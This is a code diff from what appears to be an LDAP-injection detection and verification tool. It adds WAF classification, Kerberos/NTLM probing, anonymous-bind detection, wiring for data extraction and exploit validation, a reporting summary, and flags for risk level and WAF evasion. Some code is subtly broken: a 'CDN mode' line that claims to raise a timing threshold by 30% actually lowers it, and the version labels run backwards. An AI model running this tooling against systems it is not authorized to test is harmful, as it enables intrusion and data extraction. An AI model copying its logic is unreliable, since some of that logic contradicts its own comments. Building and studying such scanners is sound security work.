         waf_fp = WAFFingerprinter(self._cfg, self._client)
         survived = waf_fp.fingerprint()
@@ -12148,17 +13735,37 @@ class ScanOrchestrator:
             waf_conf = "indeterminate"  # ambiguous — flag rather than assume
         self._handoff.waf_confidence = waf_conf
 
+        # V14: WAF Response Classifier — distinguish WAF 403 from ACL 403
         if self._client.waf_detected:
-            warn(f"WAF Detected: {self._client.waf_name} (confidence={waf_conf})")
+            waf_is_real = self._verify_waf_vs_acl()
+            if not waf_is_real:
+                self._client.waf_detected = False
+                self._handoff.waf_detected = False
+                self._handoff.waf_confidence = "none"
+                info("  [WAFClassifier] 403 appears to be ACL not WAF — waf_detected reset")
+            else:
+                warn(f"WAF Confirmed: {self._client.waf_name} (confidence={waf_conf})")
         elif waf_conf == "indeterminate":
             warn(f"WAF status INDETERMINATE — survived chars={survived_count}. Treating conservatively.")
+
+        # V14: NTLM/Kerberos detection from Phase 0 responses
+        try:
+            _r401 = self._client._get_session(AuthState.UNAUTH).get(
+                self._cfg.target, timeout=self._cfg.timeout,
+                verify=self._cfg.verify_ssl, allow_redirects=False)
+            self._detect_ntlm_kerberos(_r401)
+        except Exception:
+            pass
 
         # Network Jitter Calibration (C3.4)
         jit = NetworkJitterCalibrator(self._cfg)
         calibrated_z = jit.calibrate()
         if calibrated_z:
-            self._cfg.calibrated_z_min = calibrated_z
-            info(f"  Timing calibration: z_min={calibrated_z:.2f}")
+            if self._cfg.cdn_mode:
+                calibrated_z = calibrated_z * 0.77   # raise z_min (harder to trigger) = +30% threshold
+            self._cfg.calibrated_z_min = max(2.5, calibrated_z)
+            info(f"  Timing calibration: z_min={self._cfg.calibrated_z_min:.2f}"
+                 + (" (CDN mode)" if self._cfg.cdn_mode else ""))
             
         host = urlparse(self._cfg.target).hostname or self._cfg.target
         sans = self._extract_tls_sans(host)
@@ -12186,8 +13793,14 @@ class ScanOrchestrator:
             self._server_profile.add(raw_st, 50)
 
         self._server_type = self._server_profile.best()
-        self._handoff.raw_ldap_ports_open = intel.get("open_ports", [])
+        open_ldap_ports = intel.get("open_ports", [])
+        self._handoff.raw_ldap_ports_open = open_ldap_ports
         self._handoff.ldap_server_type = self._server_type
+        if open_ldap_ports:
+            self._cfg._ldap_ports_confirmed = open_ldap_ports  # V14: wire into T0 gate
+        if intel.get("anonymous_bind_allowed"):
+            self._cfg._anonymous_bind_confirmed = True  # V14: wire into anon bind guard
+            self._handoff.anonymous_bind_detected = True
 
         # V12: Feed stack evidence into adaptive target model
         stack_ev: List[str] = []
@@ -12321,11 +13934,34 @@ class ScanOrchestrator:
         self._handoff.endpoints_discovered = len(normalized)
         info(f"  Endpoints: {len(normalized)} discovered, {len(scannable)} scannable")
 
+        # V14: Skip WS endpoints from budget if websocket-client unavailable
+        try:
+            import websocket as _ws_check  # type: ignore
+            _ws_available = True
+        except ImportError:
+            _ws_available = False
+        if not _ws_available:
+            ws_removed = sum(1 for ep in scannable if ep.method == "WS")
+            scannable  = [ep for ep in scannable if ep.method != "WS"]
+            if ws_removed:
+                info(f"  [V14] Skipped {ws_removed} WS endpoints (websocket-client not installed)")
+
         # V12: Feedback-Driven Discovery — probe top endpoints, re-rank live
         self._fdd = FeedbackDrivenDiscovery(self._client, self._cfg, self._budget)
         info("  [V12] Running FeedbackDrivenDiscovery probes...")
         self._tracer.log("phase2", "fdd_rerank", f"probing top {min(30,len(scannable))} endpoints")
+        # V14: Adaptive FDD — also probe 10% random sample of endpoints beyond top-30
+        tail_sample: List["Endpoint"] = []
+        if len(scannable) > 30:
+            tail      = scannable[30:]
+            sample_n  = max(1, len(tail) // 10)
+            tail_sample = random.sample(tail, sample_n)
+            info(f"  [V14] FDD tail sample: {sample_n} additional endpoints from rank 31–{len(scannable)}")
         scannable = self._fdd.rerank(scannable, self._target_model)
+        # Run FDD probes on sampled tail
+        for ep in tail_sample:
+            if ep not in scannable[:30]:
+                self._fdd.probe_endpoint(ep, self._target_model)
 
         # V12: Apply AdaptiveTargetModel re-scoring on top of FDD
         scannable = self._target_model.prioritized_endpoints(scannable)
@@ -12550,6 +14186,8 @@ class ScanOrchestrator:
             chained_mutator = chained_mutator,
             cp_memory       = self._cp.memory,
         )
+        # V13 — Wire DataExtractionProbe into engine
+        engine._dep_engine = self._dep
 
         all_findings:    List[HandoffFinding]     = []
         all_inconclusives: List[InconclusiveFinding] = []
@@ -12713,10 +14351,14 @@ class ScanOrchestrator:
                 info(f"  Confidence filter: dropped {dropped} findings below {self._cfg.min_confidence}%")
             web_findings = filtered
 
+        # V13 — Populate asset registry summary in handoff
+        self._handoff.asset_registry_summary = self._asset_registry.summary()
+        self._handoff.throttler_adjustments   = self._throttler.adjustments
+
         # V12 — Exploit validation: replay CONFIRMED/PROBABLE before report
         ev = ExploitValidator(self._client, DetectionPipeline(self._cfg),
                                self._cfg, self._budget)
-        baselines_snap = getattr(self, '_last_baselines', {})
+        baselines_snap = getattr(self, "_last_baselines", {})
         for f in web_findings:
             if f.verification_grade not in (
                     VerificationGrade.CONFIRMED.value,
@@ -12798,6 +14440,8 @@ class ScanOrchestrator:
         probable   = [f for f in deduped if f.verification_grade == VerificationGrade.PROBABLE.value]
         candidates = [f for f in deduped if f.verification_grade == VerificationGrade.CANDIDATE.value]
 
+        web_findings       = deduped
+        web_findings_confirmed = confirmed
         crits    = sum(1 for f in deduped if f.severity == "CRITICAL")
         highs    = sum(1 for f in deduped if f.severity == "HIGH")
         raw_c    = len(self._raw_findings)
@@ -12862,11 +14506,13 @@ class ScanOrchestrator:
                 for i, f in enumerate(probable, 1):
                     print_finding_card(f, idx=i)
 
-            # ── Candidates ────────────────────────────────────────────────
-            if candidates and not confirmed:
-                section(f"CANDIDATES  [{len(candidates)}]")
-                for i, f in enumerate(candidates[:5], 1):
+            # ── Candidates — [V15 E8]: always shown, not just when no confirmed ─
+            if candidates:
+                section(f"CANDIDATE FINDINGS  [{len(candidates)}]  "
+                        f"[V15-E8: ANY-ONE signal — verify manually]")
+                for i, f in enumerate(candidates[:10], 1):
                     print_finding_card(f, idx=i)
+                tprint(f"\n  {color('Candidates: any-one signal fired. Manual confirmation recommended.', C.BYELLOW)}")
 
             # ── Raw LDAP direct findings ──────────────────────────────────
             if raw_c:
@@ -12885,9 +14531,100 @@ class ScanOrchestrator:
                     sev_c = C.BRED if ch.get('severity') == 'CRITICAL' else C.BYELLOW
                     tprint(f"  {color('◈', sev_c, C.BOLD)} {color(ch.get('description',''), sev_c)}")
 
-        # ── Output file paths (CMDinj style) ──────────────────────────────
+        # ── Phase 5: Reporting Summary (Enterprise CLI Format) ────────────────
         tprint()
-        tprint(color("  " + "─" * 68, C.DIM))
+        tprint(color("  " + "═" * 70, C.BBLUE))
+        tprint(color("  PHASE 5: REPORTING SUMMARY", C.BBLUE + C.BOLD))
+        tprint(color("  " + "═" * 70, C.BBLUE))
+        tprint()
+
+        # Target overview
+        tprint(f"  {color('Target Host       :', C.BCYAN)} {color(self._cfg.target, C.BWHITE)}")
+        raw_ports = getattr(self._handoff, "raw_ldap_ports_open", [])
+        web_ports = getattr(self._handoff, "target_ports_open",   [])
+        tprint(f"  {color('LDAP Ports        :', C.BCYAN)} "
+               f"{color(', '.join(str(p) for p in raw_ports) or 'none', C.BRED if raw_ports else C.DIM)}")
+        tprint(f"  {color('Web Ports         :', C.BCYAN)} "
+               f"{color(', '.join(str(p) for p in web_ports) or 'none', C.BWHITE)}")
+        live_s = color("Confirmed (HTTP 200)", C.BGREEN) if self._handoff.target_live else color("UNREACHABLE", C.BRED)
+        tprint(f"  {color('Liveness          :', C.BCYAN)} {live_s}")
+        tprint(f"  {color('LDAP Server       :', C.BCYAN)} {color(self._handoff.ldap_server_type, C.BWHITE)}")
+        waf_s = color(f"YES — {self._handoff.waf_name} [{self._handoff.waf_confidence}]",
+                      C.BYELLOW) if self._handoff.waf_detected else color("No", C.BGREEN)
+        tprint(f"  {color('WAF               :', C.BCYAN)} {waf_s}")
+        tprint()
+
+        # Finding breakdown
+        n_conf = len(web_findings_confirmed) if web_findings_confirmed else len(
+            [f for f in web_findings
+             if f.verification_grade == VerificationGrade.CONFIRMED.value])
+        n_prob = len([f for f in web_findings
+                      if f.verification_grade == VerificationGrade.PROBABLE.value])
+        n_cand = len(web_findings) - n_conf - n_prob
+        n_raw  = len(getattr(self, "_raw_findings", []))
+
+        tprint(f"  {color('Confirmed Vulns   :', C.BCYAN)} "
+               f"{color(str(n_conf), C.BRED+C.BOLD if n_conf else C.BGREEN)}")
+        tprint(f"  {color('Probable Findings :', C.BCYAN)} "
+               f"{color(str(n_prob), C.BYELLOW if n_prob else C.DIM)}")
+        tprint(f"  {color('Candidates        :', C.BCYAN)} "
+               f"{color(str(n_cand), C.DIM)}")
+        tprint(f"  {color('Direct LDAP       :', C.BCYAN)} "
+               f"{color(str(n_raw), C.BRED+C.BOLD if n_raw else C.DIM)}")
+        tprint()
+
+        # Risk level per finding
+        if web_findings:
+            tprint(color("  ── Confirmed Findings ─────────────────────────────────────────", C.DIM))
+            shown = 0
+            for f in web_findings:
+                if f.verification_grade != VerificationGrade.CONFIRMED.value:
+                    continue
+                sev_col = {
+                    "CRITICAL": C.BRED+C.BOLD, "HIGH": C.BRED,
+                    "MEDIUM": C.BYELLOW, "LOW": C.BWHITE,
+                }.get(f.severity.upper(), C.BWHITE)
+                # Impact summary
+                impact = f.impact_scenario or f.impact_type or "LDAP injection confirmed"
+                bypass_str = ""
+                if getattr(f, "is_auth_bypass", False):
+                    bypass_str = color(" [AUTH BYPASS]", C.BRED+C.BOLD)
+                tprint(
+                    f"  {color(f.severity.upper(), sev_col):<22}"
+                    f" {color(f.http_method+' '+f.endpoint_url[:40], C.BWHITE)}"
+                    f" ({f.parameter_name}){bypass_str}")
+                tprint(f"  {'':8} {color('→ '+impact[:80], C.DIM)}")
+                tprint(f"  {'':8} {color('Confidence: '+str(f.reproduction_confidence)+'%', C.BGREEN)} "
+                       f"{color('| '+f.payload_technique, C.DIM)}")
+                shown += 1
+                if shown >= 8:
+                    tprint(f"  {color('... and '+str(n_conf-shown)+' more confirmed', C.DIM)}")
+                    break
+            tprint()
+        
+        # RootDSE / direct LDAP
+        if n_raw:
+            tprint(color("  ── Direct LDAP Findings ───────────────────────────────────────", C.DIM))
+            for rf in getattr(self, "_raw_findings", [])[:4]:
+                tprint(f"  {color('CRITICAL', C.BRED+C.BOLD):<22} "
+                       f"{color(rf.host+':'+str(rf.port), C.BWHITE)} "
+                       f"{color('['+rf.finding_type+']', C.BRED)}")
+            tprint()
+
+        # Recommendation
+        tprint(color("  ── Recommendations ─────────────────────────────────────────────", C.DIM))
+        if n_conf > 0 or n_raw > 0:
+            tprint(f"  {color('▶', C.BRED)} Sanitize all LDAP filter inputs — use parameterized directory queries")
+            tprint(f"  {color('▶', C.BRED)} Disable LDAP anonymous bind ({', '.join(str(p) for p in raw_ports) or 'N/A'})")
+            tprint(f"  {color('▶', C.BRED)} Enable LDAPS (TLS) and restrict LDAP port exposure")
+            if any(getattr(f, "is_auth_bypass", False) for f in web_findings):
+                tprint(f"  {color('▶', C.BRED+C.BOLD)} AUTH BYPASS confirmed — patch before deploying to production")
+        else:
+            tprint(f"  {color('✓', C.BGREEN)} No confirmed injections — continue monitoring, test with extended payloads")
+        tprint()
+
+        # Output file paths
+        tprint(color("  " + "─" * 70, C.DIM))
         tprint()
         tprint(f"  {color('Findings JSON  :', C.BCYAN, C.BOLD)} {color(self._cfg.findings_file, C.BGREEN + C.BOLD)}")
         tprint(f"  {color('Audit NDJSON   :', C.BCYAN, C.BOLD)} {color(self._cfg.audit_file, C.BWHITE)}")
@@ -12904,10 +14641,10 @@ class ScanOrchestrator:
 
 def _parse_args() -> argparse.Namespace:
     p = argparse.ArgumentParser(
-        prog="agent389",
+        prog="ldapi_detect",
         description=(
-            "Agent389 v12.0 — "
-            "Tactical LDAP Injection Framework"
+            "LDAPi Detection Agent v10.0 — "
+            "Find -> Verify -> Handoff to Exploiter"
         ),
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
@@ -12948,6 +14685,15 @@ def _parse_args() -> argparse.Namespace:
                       help="Enable blind LDAP attribute extraction (disclaimer: noisy)")
 
     v6 = p.add_argument_group("V6 Enhancements")
+    v6.add_argument("--no-status", action="store_true", dest="no_status",
+                    help="Disable live status board (useful for log capture)")
+    v6.add_argument("--risk", type=int, choices=[1, 2, 3], default=2, dest="risk_level",
+                    help="Risk level: 1=error+bool only, 2=+timing (default), 3=+OOB+extract")
+    v6.add_argument("--output-format", choices=["json", "sarif"], default="json",
+                    dest="output_format",
+                    help="Output format: json (default) or sarif")
+    v6.add_argument("--cdn-mode", action="store_true", dest="cdn_mode",
+                    help="Increase timing thresholds 30%% for CDN-fronted targets")
     v6.add_argument("--timing-extract", action="store_true",
                     help="Enable timing side-channel extraction fallback (E1)")
     v6.add_argument("--timing-samples", type=int, default=5, metavar="N",
@@ -12993,11 +14739,11 @@ def _parse_args() -> argparse.Namespace:
     out.add_argument("--output-dir", default=".",
                      metavar="DIR")
     out.add_argument("--findings",
-                     default="agent389_findings.json",
+                     default="ldapi_findings.json",
                      metavar="FILE",
                      help="Handoff JSON filename")
     out.add_argument("--audit",
-                     default="agent389_audit.ndjson",
+                     default="ldapi_audit.ndjson",
                      metavar="FILE",
                      help="NDJSON audit log filename")
     out.add_argument("-v", "--verbose", action="store_true")
@@ -13044,6 +14790,16 @@ def _parse_auth_data(s: Optional[str]) -> Dict[str, str]:
 # ═══════════════════════════════════════════════════════════════════════════════
 
 def main() -> int:
+    if hasattr(sys.stdout, "reconfigure"):
+        try:
+            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+        except Exception:
+            pass
+    if hasattr(sys.stderr, "reconfigure"):
+        try:
+            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+        except Exception:
+            pass
     global _VERBOSE, _QUIET
     args     = _parse_args()
     _VERBOSE = args.verbose
@@ -13085,6 +14841,10 @@ def main() -> int:
         timing_extract       = getattr(args, "timing_extract",       False),
         timing_samples       = getattr(args, "timing_samples",       5),
         stateful_mode        = getattr(args, "stateful_mode",        False),
+        no_status            = getattr(args, "no_status",            False),
+        risk_level           = getattr(args, "risk_level",           2),
+        output_format        = getattr(args, "output_format",        "json"),
+        cdn_mode             = getattr(args, "cdn_mode",             False),
         state_delay          = getattr(args, "state_delay",          2.0),
         polymorphic_waf      = getattr(args, "polymorphic_waf",      True),
         poly_depth           = getattr(args, "poly_depth",           3),
